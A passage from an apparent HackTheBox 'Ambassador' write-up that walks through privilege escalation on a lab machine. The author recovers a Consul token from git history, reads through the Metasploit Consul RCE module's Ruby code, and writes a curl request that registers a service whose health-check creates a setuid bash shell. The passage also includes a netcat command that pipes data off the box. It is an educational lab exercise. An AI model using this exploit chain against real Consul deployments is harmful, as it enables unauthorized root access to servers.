+</span></span><span style=display:flex><span>drwx------ <span style=color:#d3869b>2</span> root   root   <span style=color:#d3869b>4096</span> Jan <span style=color:#d3869b>31</span> 10:41 services/
+</span></span></code></pre></div><p><code>/opt/my-app</code> is a git directory and there&rsquo;s a django app inside it. And then there&rsquo;s <a href=https://www.consul.io/>consul</a></p><blockquote><p><em>Consul</em> is a service networking solution to automate network configurations, discover services, and enable secure connectivity across any cloud or runtime.</p></blockquote><p>There&rsquo;s an interesting script inside <code>whackywidget</code></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>developer@ambassador:/opt/my-app/whackywidget$ cat put-config-in-consul.sh
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## We use Consul for application config in production, this script will help set the correct values for the app</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>## Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</span></span></code></pre></div><p>According to the <a href=https://developer.hashicorp.com/consul/commands/kv/put>consul docs</a>, the <code>kv put</code> command writes the data to the given path in the KV store. We can try the <code>kv get</code> command to read the password:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>developer@ambassador:/opt/my-app/whackywidget$ consul kv get whackywidget/db/mysql_pw
+</span></span><span style=display:flex><span>Error querying Consul agent: Unexpected response code: <span style=color:#d3869b>403</span> <span style=color:#fe8019>(</span>Permission denied: token with AccessorID <span style=color:#b8bb26>&#39;00000000-0000-0000-0000-000000000002&#39;</span> lacks permission <span style=color:#b8bb26>&#39;key:read&#39;</span> on <span style=color:#b8bb26>&#34;whackywidget/db/mysql_pw&#34;</span><span style=color:#fe8019>)</span>
+</span></span></code></pre></div><p>Permission denied&mldr;</p><p>Let&rsquo;s check if there&rsquo;s a service running locally, then <a href=https://developer.hashicorp.com/consul/api-docs/kv#sample-request>according to the api doc</a> we can try to get the key from <code>/v1/kv/my-key</code></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>developer@ambassador:/opt/my-app$ ss -tulpn | grep <span style=color:#d3869b>8500</span>
+</span></span><span style=display:flex><span>tcp    LISTEN  <span style=color:#d3869b>0</span>       <span style=color:#d3869b>4096</span>         127.0.0.1:8500         0.0.0.0:*
+</span></span></code></pre></div><p><code>8500</code> is the default port and it is listening.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>developer@ambassador:/opt/my-app$ curl http://127.0.0.1:8500/v1/kv/my-key
+</span></span><span style=display:flex><span>Permission denied: token with AccessorID <span style=color:#b8bb26>&#39;00000000-0000-0000-0000-000000000002&#39;</span> lacks permission <span style=color:#b8bb26>&#39;key:read&#39;</span> on <span style=color:#b8bb26>&#34;my-key&#34;</span>
+</span></span></code></pre></div><p>Permission denied again&mldr;</p><p>Anyway let&rsquo;s check the git history of <code>my-app</code> using <code>git log</code></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>developer@ambassador:/opt/my-app$ git log --all --oneline
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>33a53ef <span style=color:#fe8019>(</span>HEAD -&gt; main<span style=color:#fe8019>)</span> tidy config script
+</span></span><span style=display:flex><span>c982db8 config script
+</span></span><span style=display:flex><span>8dce657 created project with django CLI
+</span></span><span style=display:flex><span>4b8597b .gitignore
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>developer@ambassador:/opt/my-app$ git show c982db8
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+</span></span><span style=display:flex><span>Author: Developer &lt;developer@ambassador.local&gt;
+</span></span><span style=display:flex><span>Date:   Sun Mar <span style=color:#d3869b>13</span> 23:44:45 <span style=color:#d3869b>2022</span> +0000
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    config script
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+</span></span><span style=display:flex><span>new file mode <span style=color:#d3869b>100755</span>
+</span></span><span style=display:flex><span>index 0000000..35c08f6
+</span></span><span style=display:flex><span>--- /dev/null
+</span></span><span style=display:flex><span>+++ b/whackywidget/put-config-in-consul.sh
+</span></span><span style=display:flex><span>@@ -0,0 +1,4 @@
+</span></span><span style=display:flex><span>+# We use Consul <span style=color:#fe8019>for</span> application config in production, this script will <span style=color:#fabd2f>help</span> <span style=color:#fabd2f>set</span> the correct values <span style=color:#fe8019>for</span> the app
+</span></span><span style=display:flex><span>+# Export MYSQL_PASSWORD before running
+</span></span><span style=display:flex><span>+
+</span></span><span style=display:flex><span>+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</span></span></code></pre></div><p>By checking out the previous commit, we can see the consul token.</p><h3 id=consul-rce-via-services-api><a href=#consul-rce-via-services-api class=anchor-head aria-label=Anchor></a>Consul RCE via Services API</h3><p>From <code>searchsploit</code> output we can see that there&rsquo;s a metasploit script that expoloits an <strong>RCE</strong></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span> searchsploit consul
+</span></span><span style=display:flex><span>------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                              |  Path
+</span></span><span style=display:flex><span>------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>Hashicorp Consul - Remote Command Execution via Rexec <span style=color:#fe8019>(</span>Meta | linux/remote/46073.rb
+</span></span><span style=display:flex><span>Hashicorp Consul - Remote Command Execution via Services AP | linux/remote/46074.rb
+</span></span><span style=display:flex><span>Hassan Consulting Shopping Cart 1.18 - Directory Traversal  | cgi/remote/20281.txt
+</span></span><span style=display:flex><span>Hassan Consulting Shopping Cart 1.23 - Arbitrary Command Ex | cgi/remote/21104.pl
+</span></span><span style=display:flex><span>PHPLeague 0.81 - <span style=color:#b8bb26>&#39;/consult/miniseul.php?cheminmini&#39;</span> Remote  | php/webapps/28864.txt
+</span></span><span style=display:flex><span>------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results
+</span></span></code></pre></div><p>I don&rsquo;t want to use metasploit to exploit this. So let&rsquo;s disect the exploit script.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>check</span>
+</span></span><span style=display:flex><span>    res <span style=color:#fe8019>=</span> send_request_cgi({
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;method&#39;</span>  <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#39;GET&#39;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;uri&#39;</span>     <span style=color:#fe8019>=&gt;</span> normalize_uri(target_uri<span style=color:#fe8019>.</span>path, <span style=color:#b8bb26>&#39;/v1/agent/self&#39;</span>),
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;headers&#39;</span> <span style=color:#fe8019>=&gt;</span> {
+</span></span><span style=display:flex><span>        <span style=color:#b8bb26>&#39;X-Consul-Token&#39;</span> <span style=color:#fe8019>=&gt;</span> datastore<span style=color:#fe8019>[</span><span style=color:#b8bb26>&#39;ACL_TOKEN&#39;</span><span style=color:#fe8019>]</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    })
+</span></span></code></pre></div><p>There&rsquo;s a <code>check</code> function which checks whether the service is vulnerable or not. It uses the consul token we found from <code>git log</code> inside <code>X-Consul-Token</code> header to access <code>/v1/agent/self</code></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>developer@ambassador:/opt/my-app$ curl http://127.0.0.1:8500/v1/agent/self -H <span style=color:#b8bb26>&#39;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#39;</span>
+</span></span></code></pre></div><p>We get a mess ( <code>json</code> data ) as output so we have to save that to a file. I can show a cool trick to save the file on the remote host:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#928374;font-style:italic># Run this in the box</span>
+</span></span><span style=display:flex><span>developer@ambassador:/opt/my-app$ <span style=color:#fabd2f>echo</span> <span style=color:#fe8019>$(</span>curl http://127.0.0.1:8500/v1/agent/self -H <span style=color:#b8bb26>&#39;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#39;</span> --silent <span style=color:#fe8019>)</span> | nc -lnvp <span style=color:#d3869b>1234</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Run this in your machine</span>
+</span></span><span style=display:flex><span> nc 10.10.11.183 <span style=color:#d3869b>1234</span> &gt; v1.agent.self.json
+</span></span></code></pre></div><p>Or you can just copy paste the output instead&mldr;</p><p>The metasploit script then parses this <code>json</code> data and does some checks to find out whether it is vulnerable or not:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>agent_info <span style=color:#fe8019>=</span> <span style=color:#d3869b>JSON</span><span style=color:#fe8019>.</span>parse(res<span style=color:#fe8019>.</span>body)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>if</span> agent_info<span style=color:#fe8019>[</span><span style=color:#b8bb26>&#34;Config&#34;</span><span style=color:#fe8019>][</span><span style=color:#b8bb26>&#34;EnableScriptChecks&#34;</span><span style=color:#fe8019>]</span> <span style=color:#fe8019>==</span> <span style=color:#fe8019>true</span> <span style=color:#fe8019>||</span> agent_info<span style=color:#fe8019>[</span><span style=color:#b8bb26>&#34;DebugConfig&#34;</span><span style=color:#fe8019>][</span><span style=color:#b8bb26>&#34;EnableScriptChecks&#34;</span><span style=color:#fe8019>]</span> <span style=color:#fe8019>==</span> <span style=color:#fe8019>true</span> <span style=color:#fe8019>||</span> agent_info<span style=color:#fe8019>[</span><span style=color:#b8bb26>&#34;DebugConfig&#34;</span><span style=color:#fe8019>][</span><span style=color:#b8bb26>&#34;EnableRemoteScriptChecks&#34;</span><span style=color:#fe8019>]</span> <span style=color:#fe8019>==</span> <span style=color:#fe8019>true</span>
+</span></span><span style=display:flex><span>      <span style=color:#fe8019>return</span> <span style=color:#d3869b>CheckCode</span><span style=color:#fe8019>::</span><span style=color:#d3869b>Vulnerable</span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>end</span>
+</span></span></code></pre></div><p>We can use <code>jq</code> to check these conditions rather than searching manually through the whole file:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span> cat v1.agent.self.json | jq <span style=color:#b8bb26>&#34;.Config.EnableScriptChecks&#34;</span>
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span> cat v1.agent.self.json | jq <span style=color:#b8bb26>&#34;.DebugConfig.EnableScriptChecks&#34;</span>
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span> cat v1.agent.self.json | jq <span style=color:#b8bb26>&#34;.DebugConfig.EnableRemoteScriptChecks&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#fabd2f>true</span>
+</span></span></code></pre></div><p>And we can see that <code>EnableRemoteScriptChecks</code> is <code>true</code> and hence it is vulnerable.</p><p>The <code>exploit_command</code> function sends a <code>PUT</code> request to <a href=https://developer.hashicorp.com/consul/api-docs/agent/service#register-service><code>v1/agent/service/register</code></a> with the consul token and a <code>json</code> data. Inside the json data there&rsquo;s a payload. We can add our reverse shell there.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>execute_command</span>(cmd, opts <span style=color:#fe8019>=</span> {})
+</span></span><span style=display:flex><span>    uri <span style=color:#fe8019>=</span> target_uri<span style=color:#fe8019>.</span>path
+</span></span><span style=display:flex><span>    service_name <span style=color:#fe8019>=</span> <span style=color:#d3869b>Rex</span><span style=color:#fe8019>::</span><span style=color:#d3869b>Text</span><span style=color:#fe8019>.</span>rand_text_alpha(<span style=color:#d3869b>5</span><span style=color:#fe8019>..</span><span style=color:#d3869b>10</span>)
+</span></span><span style=display:flex><span>    print_status(<span style=color:#b8bb26>&#34;Creating service &#39;</span><span style=color:#b8bb26>#{</span>service_name<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#39;&#34;</span>)
+</span></span><span style=display:flex><span>    res <span style=color:#fe8019>=</span> send_request_cgi({
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;method&#39;</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#39;PUT&#39;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;uri&#39;</span> <span style=color:#fe8019>=&gt;</span> normalize_uri(uri, <span style=color:#b8bb26>&#39;v1/agent/service/register&#39;</span>),
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;headers&#39;</span> <span style=color:#fe8019>=&gt;</span> {
+</span></span><span style=display:flex><span>        <span style=color:#b8bb26>&#39;X-Consul-Token&#39;</span> <span style=color:#fe8019>=&gt;</span> datastore<span style=color:#fe8019>[</span><span style=color:#b8bb26>&#39;ACL_TOKEN&#39;</span><span style=color:#fe8019>]</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;ctype&#39;</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#39;application/json&#39;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;data&#39;</span> <span style=color:#fe8019>=&gt;</span> {
+</span></span><span style=display:flex><span>        <span style=color:#83a598>:ID</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>#{</span>service_name<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#83a598>:Name</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>#{</span>service_name<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#83a598>:Address</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#34;127.0.0.1&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#83a598>:Port</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#d3869b>80</span>,
+</span></span><span style=display:flex><span>        <span style=color:#83a598>:check</span> <span style=color:#fe8019>=&gt;</span> {
+</span></span><span style=display:flex><span>          <span style=color:#83a598>:script</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>#{</span>cmd<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#83a598>:Args</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#fe8019>[</span><span style=color:#b8bb26>&#34;sh&#34;</span>, <span style=color:#b8bb26>&#34;-c&#34;</span>, <span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>#{</span>cmd<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#34;</span><span style=color:#fe8019>]</span>,
+</span></span><span style=display:flex><span>          <span style=color:#83a598>:interval</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#34;10s&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#83a598>:Timeout</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#34;86400s&#34;</span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      }<span style=color:#fe8019>.</span>to_json
+</span></span><span style=display:flex><span>    })
+</span></span></code></pre></div><p>Once the service is created and check script is executed it sends another request to <code>v1/agent/service/deregister/#service_name</code> to remove the service.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>    print_status(<span style=color:#b8bb26>&#34;Service &#39;</span><span style=color:#b8bb26>#{</span>service_name<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#39; successfully created.&#34;</span>)
+</span></span><span style=display:flex><span>    print_status(<span style=color:#b8bb26>&#34;Waiting for service &#39;</span><span style=color:#b8bb26>#{</span>service_name<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#39; script to trigger&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>sleep</span>(<span style=color:#d3869b>12</span>)
+</span></span><span style=display:flex><span>    print_status(<span style=color:#b8bb26>&#34;Removing service &#39;</span><span style=color:#b8bb26>#{</span>service_name<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#39;&#34;</span>)
+</span></span><span style=display:flex><span>    res <span style=color:#fe8019>=</span> send_request_cgi({
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;method&#39;</span> <span style=color:#fe8019>=&gt;</span> <span style=color:#b8bb26>&#39;PUT&#39;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;uri&#39;</span> <span style=color:#fe8019>=&gt;</span> normalize_uri(
+</span></span><span style=display:flex><span>        uri,
+</span></span><span style=display:flex><span>        <span style=color:#b8bb26>&#34;v1/agent/service/deregister/</span><span style=color:#b8bb26>#{</span>service_name<span style=color:#b8bb26>}</span><span style=color:#b8bb26>&#34;</span>
+</span></span><span style=display:flex><span>      ),
+</span></span><span style=display:flex><span>      <span style=color:#b8bb26>&#39;headers&#39;</span> <span style=color:#fe8019>=&gt;</span> {
+</span></span><span style=display:flex><span>        <span style=color:#b8bb26>&#39;X-Consul-Token&#39;</span> <span style=color:#fe8019>=&gt;</span> datastore<span style=color:#fe8019>[</span><span style=color:#b8bb26>&#39;ACL_TOKEN&#39;</span><span style=color:#fe8019>]</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    })
+</span></span><span style=display:flex><span>  <span style=color:#fe8019>end</span>
+</span></span></code></pre></div><p>From this information we can craft a <code>curl</code> request to execute our payload:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl -XPUT http://127.0.0.1:8500/v1/agent/service/register -H <span style=color:#b8bb26>&#39;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#39;</span> -H <span style=color:#b8bb26>&#39;Content-Type: application/json&#39;</span> --data <span style=color:#b8bb26>&#39;{&#34;ID&#34;: &#34;h4r1337&#34;, &#34;name&#34;: &#34;h4r1337&#34;, &#34;Address&#34;: &#34;127.0.0.1&#34;, &#34;Port&#34;: 80, &#34;check&#34;: {&#34;Args&#34;: [&#34;sh&#34;, &#34;-c&#34;, &#34;cp /bin/bash /tmp/bash;chmod 4777 /tmp/bash&#34;], &#34;interval&#34;: &#34;10s&#34;, &#34;Timeout&#34;: &#34;86400s&#34;}}&#39;</span>
+</span></span></code></pre></div><br><figure><img src=/img/ambassador/Pasted%20image%2020230131205827.webp></figure></div></article></main><aside id=sticky-top><div class=toc-title><p>Ambassador | HackTheBox</p><hr id=toc-hr></div><nav id=toc class=toc-container><nav id=TableOfContents><ul><li><ul><li><a href=#overview>Overview</a></li></ul></li><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#port-80---http-apache-2441>Port 80 - HTTP (Apache 2.4.41)</a></li><li><a href=#port-3000---http-grafana>Port 3000 - HTTP (Grafana)</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#directory-traversal>Directory Traversal</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#local-enumeration>Local Enumeration</a></li><li><a href=#consul-rce-via-services-api>Consul RCE via Services API</a></li></ul></li></ul></nav></nav></aside><small class=post-updated-at>updated at 2023-01-31</small><hr><div class=series-nav><div class="alert alert-note"><div class=alert-heading-box><a href=https://h4r1337.github.io/series/hack-the-box/><p class=alert-heading>Hack the Box Series</p></a></div></div><nav class=post-nav style=margin-top:1rem;border-top:none><a class="post-nav-item post-nav-next" href=https://h4r1337.github.io/posts/photobomb/><div class=nav-arrow>Next in series</div><span class=post-title>Photobomb | HackTheBox</span></a></nav></div><nav class=post-nav><a class="post-nav-item post-nav-prev" href=https://h4r1337.github.io/posts/simple-ctf/><div class=nav-arrow>Previous</div><span class=post-title>Simple CTF | TryHackMe</span>
+</a><a class="post-nav-item post-nav-next" href=https://h4r1337.github.io/posts/photobomb/><div class=nav-arrow>Next</div><span class=post-title>Photobomb | HackTheBox</span></a></nav></div><footer class=footer><a class=footer_item href=javascript::void(0)>resume</a>
+<a class=footer_item href=/index.xml>rss</a>
+<span class=footer_item>&copy; 2026</span>
+<small class=footer_copyright><a href=https://github.com/h4r1337/hugo-klise target=_blank rel="noreferrer noopener">hugo-klisé</a>
+theme on
+<a href=https://gohugo.io target=_blank rel="noreferrer noopener">Hugo</a><br><span>Made by <a href=https://github.com/h4r1337 target=_blank rel="noreferrer noopener">h4r1337</a></span></small></footer><script src=/js/main.js defer></script><script src=/js/toc.js defer></script></body></html>
